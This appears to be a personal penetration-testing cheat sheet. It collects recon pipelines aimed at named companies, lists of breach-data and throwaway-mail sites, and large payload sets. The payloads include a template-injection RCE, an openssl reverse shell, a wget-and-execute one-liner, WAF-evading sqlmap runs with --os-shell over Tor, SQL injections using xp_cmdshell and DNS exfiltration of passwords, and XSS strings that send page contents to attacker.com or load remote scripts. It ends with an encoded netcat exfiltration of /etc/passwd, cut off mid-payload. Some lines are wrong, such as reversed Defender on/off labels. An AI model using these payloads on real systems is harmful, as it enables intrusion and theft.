### Some website for security analyt
- https://securityheaders.io/
- https://vulnerabilitytest.quixxi.com/#/
- https://www.virustotal.com/gui/
- https://packettotal.com/

### Update all package with pip
- Windows
```
pip freeze | %{$_.split('==')[0]} | %{pip install --upgrade $_}
or
pip3 list --outdated --format=freeze | ForEach { pip3 install -U $_.split(" ")[0] }
```
- Linux
```
>To upgrade all packages using pip with grep on Ubuntu Linux:
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U 

>To upgrade all packages using pip with awk on Ubuntu Linux:
pip3 list -o | cut -f1 -d' ' | tr " " "\n" | awk '{if(NR>=3)print)' | cut -d' ' -f1 | xargs -n1 pip3 install -U 

```

### Awsome command
```
ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net

java -jar <jar-file-name>.jar

PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1

Turn on defender - Set-MpPreference -DisableRealtimeMonitoring $true
Turn off defender - Set-MpPreference -DisableRealtimeMonitoring $false

python2 -m SimpleHTTPServer + port(default 8000)
python3 -m http.server + port(default 8000)

pip3 install -r ./requirements.txt

dnscmd <ServerName> /Config /NoRecursion {1|0}
q5MmE8;2X'877q=g9MjzfB@4NAZ[Nw8K
RD /S /Q %SystemDrive%\windows.old 

$env:Path += ";C:\Python27\Scripts"
```

### Open-source intelligence (OSINT)
```
assetfinder -subs-only http://paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"

rush -j100 -i bitquark-subdomains-top100000.txt 'curl -s -L "https://dns.google.com/resolve?name{}.tesla.com&type=A&cd=true" | sed "s#\"#\n#g;s# #\n#g" | grep "tesla"' | sed 's#\.$##g' | anew teslaDomains 

rush -i /opt/recon/xxx/hostsAlive -j 10 'ffuf -o $(echo {} | unfurl domains) -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u "{}/FUZZ" -sf -ignore-body -mc 200 -t 300'

shodan domain http://sony.com | awk '{print $3}' | httpx -silent | rush -j 3 'python3 http://smuggler.py -u {}'

shodan domain TARGET | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'

shodan domain http://sony.com | awk '{print $1}' | httpx -silent | xargs -I@ sh -c 'ffuf -w fuzz-Bo0oM.txt -u @/FUZZ -replay-proxy http://192.168.15.28:8080 -t 10 -mc 200'

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | parallel -I% -j 100 'curl -s http://%/ajax/render/PAYLOAD" | grep VULN 

chaos -silent -d http://paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -silent -title| tr "[]" " "

chaos -d http://att.com -silent | httpx -silent | anew domains | rush 'subjack -w {} -t 100 -timeout 30 -ssl -c fingerprints.json -v 3' >> takeover

curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'

curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew'm

curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path path -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew 

wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @

wget -nv -nc https://chaos-data.projectdiscovery.io/playstation.zip ; unzip http://playstation.zip ; cat *.txt | httpx -silent -threads 300 | anew fullAlive; gospider -a -d 0 -S fullAlive -c 5 -t 100 -d 5 --blacklist black | egrep -o '(http|https)://[^/"]+' | anew httpSpider 

wget https://chaos-data.projectdiscovery.io/lime.zip -nv ; unzip http://lime.zip ; cat *.txt >> lime.txt ; cat lime.txt | httpx -silent -threads 200 | gau -subs -retries 2| anew | rush -j 3 'jaeles scan -s /jaeles-signatures/ -u {}'

findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

--link--

- https://leak.sx
- http://scylla.sh
- https://intelx.io
- https://4iq.com
- https://leaked.site
- https://hashes.org
- https://leakcheck.io
- https://vigilante.pw
- https://leakcheck.net
- https://weleakinfo.to
- https://leakcorp.com
- https://leakpeek.com
- https://rslookup.com
- https://snusbase.com
- https://ghostproject.fr
- https://leakedsource.ru
- https://leak-lookup.com
- https://nuclearleaks.com
- https://private-base.info
- https://haveibeensold.app
- https://breachchecker.com
- https://www.dehashed.com
- http://scatteredsecrets.com
- https://haveibeenpwned.com
- https://services.normshield.com
- https://joe.black/leakengine.html
- https://www.social-searcher.com/

### Search Book
- https://b-ok.org/
- https://www.pdfdrive.com/
-  http://www.allitebooks.org/
- b-ok.cc : https://b-ok.cc/
- b-ok2.org :  https://b-ok2.org/
- booksc : https://booksc.xyz/
ư◾️ https://ebookpdf.com

### RCE
```
%23set($x=%27%27)
+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))
+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))
+$ex.waitFor()+%23set($out=$ex.getInputStream())
+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

curl -fsSI "https://web.archive.org/save/<url>" | grep content-location | awk '{printf ("https://web.archive.org%s\n", $2)}'

head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '
```

### Best Temporary mailbox (Updates)
- https://www.guerrillamail.com/en/
- https://10minutemail.com
- https://www.trash-mail.com/inbox/
- https://www.mailinator.com
- http://www.yopmail.com/en
- https://generator.email
- https://en.getairmail.com
- http://www.throwawaymail.com/en
- https://maildrop.cc
- https://owlymail.com/en
- https://www.moakt.com
- https://tempail.com
- http://www.yopmail.com
- https://temp-mail.org/en
- https://www.mohmal.com 👍🏻 Best options
- http://od.obagg.com 👍🏻 Best options
- http://onedrive.readmail.net 👍🏻 Best options
- http://xkx.me 👍🏻 Best options
- https://t.odmail.cn 👍🏻 ( you can register email from Microsoft and get 5TB onedrive Office365 )
- https://www.emailondeck.com
- https://smailpro.com
- https://anonbox.net
- https://M.kuku.lu


### Some Rate Limit Bypass Headers
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Client-IP : 127.0.0.1
X-Host : 127.0.0.1
Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-IP: 127.0.0.1
X-True-IP: 127.0.0.1
```

curl -v -H “Authorization: Bearer <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/pods/
/default/secrets/
/default/deployments
/default/daemonsets


Reverse SSL shell openssl - @ThemsonMester

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt

mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s

===========Linux Command Privilege Escalation Exploit================
uname \"$(bash -c \\\"$(wget http://example.com/file )\\\")\"

### Nmap command
```
nmap -vv -Pn --script http-slowloris-check 
nmap -vv -Pn --script http-iis-short-name-brute
nmap -sV --script=banner --script ssl-enum-ciphers --script http-slowloris-check  --script smb-enum-shares.nse --script ssl-dh-params
nmap -sV -vv -Pn --script ssl-enum-ciphers --script ssl-dh-params --script ssl-poodle --script=sslv2-drown --script ssl-heartbleed --script rsa-vuln-roca
nmap -sV --script=http-php-version 
nmap --script http-webdav-scan -p80,8080 <target>
nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
nmap --script dns-brute www.foo.com
nmap -p80 --script http-iis-short-name-brute <target>
nmap -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' >>Remote Code Execution in HTTP.sys (MS15-034)
nmap -p445 --script smb-vuln-* <target>  
nmap --script=http-waf-fingerprint <targets>
nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 <targets>
nmap -p80 --script http-waf-detect <host>
nmap --script firewall-bypass <target>
nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 <target>
nmap --script=http-traceroute <targets>
nmap --script http-open-proxy.nse --script-args proxy.url=<url>,proxy.pattern=<pattern>

nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script http-dombased-xss.nse --script=http-unsafe-output-escaping --script=http-sql-injection --script http-rfi-spider --script http-csrf.nse --script http-security-headers --script http-enum --script http-title --script ssl-ccs-injection --script http-shellshock --script http-cookie-flags.nse --script http-cors.nse --script http-enum.nse --script http-errors.nse --script http-exif-spider.nse --script http-fileupload-exploiter.nse --script http-form-brute.nse --script http-form-fuzzer.nse --script http-frontpage-login.nse --script http-iis-webdav-vuln.nse --script http-internal-ip-disclosure.nse --script http-open-redirect.nse --script http-malware-host.nse --script http-phpself-xss.nse --script http-phpmyadmin-dir-traversal.nse --script http-php-version.nse --script http-robots.txt.nse --script http-server-header.nse --script http-userdir-enum.nse --script http-waf-detect.nse --script http-waf-fingerprint.nse --script http-xssed.nse --script ssl-enum-ciphers.nse --script ssl-heartbleed.nse --script ssl-poodle.nse --script sslv2-drown.nse --script whois-domain.nse --script dns-fuzz.nse --script http-aspnet-debug.nse --script http-auth-finder.nse --script http-auth.nse --script http-backup-finder.nse 

# Basic usage:
nmap target --script whois-ip

# To prevent the use of IANA assignments data supply the nofile value
# to the whodb argument:
nmap target --script whois-ip --script-args whodb=nofile
nmap target --script whois-ip --script-args whois.whodb=nofile

# Supplying a sequence of whois services will also prevent the use of
# IANA assignments data and override the default sequence:
nmap target --script whois-ip --script-args whodb=arin+ripe+afrinic
nmap target --script whois-ip --script-args whois.whodb=apnic*lacnic
# The order in which the services are supplied is the order in which
# they will be queried. (N.B. commas or semi-colons should not be
# used to delimit argument values.)

# To return the first record obtained even if it contains a referral
# to another service, supply the nofollow value to whodb:
nmap target --script whois-ip --script-args whodb=nofollow
nmap target --script whois-ip --script-args whois.whodb=nofollow+ripe
# Note that only one service (the first one supplied) will be used in
# conjunction with nofollow.

# To ensure discovery of smaller assignments even if larger ones
# exist in the cache, supply the nocache value to whodb:
nmap target --script whois-ip --script-args whodb=nocache
nmap target --script whois-ip --script-args whois.whodb=nocache

nmap --script whois-domain.nse <target>
```


### SQLMAP Bypass Waf
```
python sqlmap.py -u
"http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1"
-p itm_id --dbms=mssql --level=5 --risk=3
--tamper=between,space2comment -o --random-agent --parse-errors
--os-shell --technique=ES

-u "http://localhost/vuln/test.php?feature=music&song=1" -p song
-u "http://localhost/vuln/test.php?feature=music&song=1" -p 'song,feature'

--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
--dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
--dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
sqlmap -u http://www.********?id=1 --level 2 --risk 3 --batch --dbs
 
-f -b --current-user --current-db --is-dba --users --dbs
 
--risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
 
--risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
 
--random-agent --dbms=MYSQL --dbs --technique=B"
 
--identify-waf --random-agent -v 3 --dbs
 
1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3
 
--threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
 
--tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
 
sqlmap.py -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
 
--banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
-v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu
 
C:\Python27\python.exe sqlmap.py --wizard
 
--level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
 
 
sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
 
sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
 
 
sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
 
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
 
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
 
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
 
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
```

### SQL injection
```
MYSQL INJECTION - BYPASS UNION SELECT (WAF)
WHAT IS BYPASS : when target having WAF (web application firewall) secure encption or security on there server its cannot be directly get any vulnerble columns or its cannot be injeCted! so there haCker try to put diffrent query in combined charachaters encrpted,encoded,modifyed sql query parameters like one called UNION SELECT or UNION ALL SELECT!
there is all types of waf bypass method for bypass union select!
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#union+#select
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*//*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union(/*!/**/SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
/**//*!union*//**//*!select*//**/
/*!uNIOn*//*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
+union+select+1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(user)WHERE(@x)IN(@x:=CONCAT(0x20,@x,user,0x203a3a20,pass,0x3c62723e))))x),3,4,5,6,7,8--+-
0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z

-1' OR 32<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 32>(1+2+4) or '4mEwSPwJ'=' => FALSE

b"action=challenge&user=" + args.user.encode('utf-8') + b"' AND
user_password LIKE \'" + temp_pass.encode('utf-8') + b"%' AND
substr(user_password,1," + str(temp_pass_len).encode('utf-8') + b") = '" +
temp_pass.encode('utf-8') + b"'--")

login =
'{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"'
+ username + '\' AND LENGTH(user_password)==' + str(length) + ' AND
88=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2)))) or
\'1\'=\'2","token":"lolwat"}}'
33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'

(SELECT 7397 FROM (SELECT(SLEEP(15)))nu11secur1ty)
id=1337 and 1=(select 1 from information_schema.table_constraints where table_name regexp ‗^us[a-z]‘ limit 0,1) –
 
Non-standard whitespace characters: %C2%85 или %C2%A0:
1%C2%85union%C2%85select%C2%A0null,@@version,null-- 

Scientific (0e) and hex (0x) notation for obfuscating UNION:
0eunion+select+null,@@version,null--
0xunion+select+null,@@version,null-- 

A period instead of a whitespace between FROM and a column name:
1+union+select+null,@@version,null+from.users-- 

 \N seperator between SELECT and a throwaway column:
0xunion+select\Nnull,@@version,null+from+users-- 


*****ASP .NET
' and 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) — -+
'AND 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) or '1'='
 -1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
 1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)-- 
-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null
1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))-- 
-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null

** Error-Based vectors **
- SUSER_NAME()
- USER_NAME()
- PERMISSIONS()
- DB_NAME()
- FILE_NAME()
- TYPE_NAME()
- COL_NAME()
 
 
*****DNS Out-of-Band 
If confronted with a fully blind SQL injection with disabled stacked queries, it’s possible to attain DNS out-of-band (OOB) data exfiltration via the functions fn_xe_file_target_read_file, fn_get_audit_file, and  fn_trace_gettable, example:
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:*.xel','\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```


### XSS
```
javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
javascript://comment%0a%0dalert(0);
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
<input onfocus="alert(0);" autofocus>
onload=\"a='aler';d='XSS';b='t('+d+')';c=a+b;console.log(eval(c));
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
Angular JS short vector by @garethheyes 
{{$eval.constructor('alert(1)')()}}

Even shorter by @LewisArdern
{{$on.constructor('alert(1)')()}}

<object/onerror=write`1`//
<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>
CSP Bypass by @Rhynorater
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://rhy.xss.ht ";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
CSP Bypass by @Rhynorater
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://rhy.xss.ht ";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
<svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
<!--*/!'*/!>%0D<svg/onload=confirm`1`//

Incapsula WAF bypass by @daveysec 
<svg onload\r\n=$.globalEval("al"+"ert()");>

// Gareth Heyes - https://twitter.com/garethheyes
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>

// clrf -  http://polyglot.innerht.ml/
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">

<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">

<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<svg/whatthe=""onload=alert(45)>
%60%7D%2b%22%2balert(1337);x=%60%7D%7B(class%20$%7By=%60

"><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>

"><script src='https://domain'></script>

<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>

<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//


Imperva WAF Bypass for XSS;
<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
- without parentheses, 'alert', 'document.domain' , 'window' , space
"<svg/onload=alert(1)>"@x.y
javascript://%250Aalert(1)
javascript://%250A1?alert(1):0
" formaction=java%26Tab%3bscript:ale%26Tab%3brt() type=image src=""
javascript://%250Aalert(1)//?1
javascript://https://domain.com/%250A1?alert(1):0
12345678901<svg onload=alert(1)>
\'-alert(1)//
'-alert(1)-'

with (l33t()) {
  c0ns0l3.w4rn('l33t');
  al3rt('w00t');
}

document.cookie = "test='/require('child_process').exec('calc.exe')//"

function l33t(p=this){return new Proxy(p,{has:()=>!0,get:(t,n)=>(p=Reflect.get(t,String(n).replace(/\d/g,a=>'oizeasGtBg'[a])))?p.apply?p.bind(t):l33t(p):p})}

<svg onload='alert(1)'/>

<input autofocus onfocus=alert(1)>

<video><source onerror="JavaScript:alert(1)">

<marquee onstart=alert(1)>

window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
<+!-<script/src+=+\\//\\http://14.rs \\//\\+></script/src>->
<script>eval('al'+'ert(1)');</script>  
<script>'alert(1)'.replace(/.+/,eval)</script>
<img onerror=eval('al\u0065rt(1)') src=a>
<script>function::['alert'](1)</script>

Wordfence 7.4.2
<a href=&#01javascript:alert(1)>

Sucuri CloudProxy (POST only)
<a href=javascript&colon;confirm(1)>

ModSecurity CRS 3.2.0 PL1
<a href="jav%0Dascript&colon;alert(1)">

"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`}//' allowscriptaccess=always>

"><object data='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`}//' allowscriptaccess=always>

"><base href="//domain">
<script nonce='secret' src='./scripts/foo.js'></script>

"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<script>$.getScript("//domain")</script>
"><script src="//domain/xss.js"></script>
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>
javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)');
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>
"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"> 
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
"><script src=//analytics.twitter.com/tpm?tpm_cb=alert(document.domain)>//
<script>alert(1)//
<script>alert(1)<!--
<script>alert(1)%0A-->
<script src=data:,alert(1)>
<script src=//HOST/FILE>
<script src=https:DOMAIN/FILE>
<svg><script xlink:href=//HOST/FILE>
<svg><script xlink:href=https:DOMAIN/FILE>
javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/
+/onmouseover=1/+/[*/[]/+alert(/
@PortSwiggerRes
/)//'>

%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>

# Payload: exec(AttackerReverse netcat stolen => /etc/passwd) && exec(calc)
[<audio src=x onerror=writeln(String.fromCharCode(10,60,97,117,100,105,111,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,34,99,111,110,115,116,32,101,120,101,99,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,59,10,101,120,101,99,40,39,110,99,32,45,119,32,51,32,49,57,50,46,49,54,56,46,49,49,49,46,49,50,57,32,49,51,51,55,32,60,32,47,101,116,99,47,112,97,115,115,119,100,39,44,32,40,101,44,32,115,116,100,111,117,116,44,32,115,116,100,101,114,114,41,61,62,32,123,32,105,102,32,40,101,32,105,110,115,116,97,110,99,101,111,102,32,69,114,114,111,114,41,32,123,10,99,111,110,115,111,108,101,46,101,114,114,111,114,40,101,41,59,32,116,104,114,111,119,32,101,59,32,125,32,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,111,117,116,32,39,44,32,115,116,100,111,117,116,41,59,10,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,101,114,114,32,39,44,32,115,116,100,101,114,114,41,59,125,41,59,10,97,108,101,114,116,40,39,49,39,41,34,62,60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,11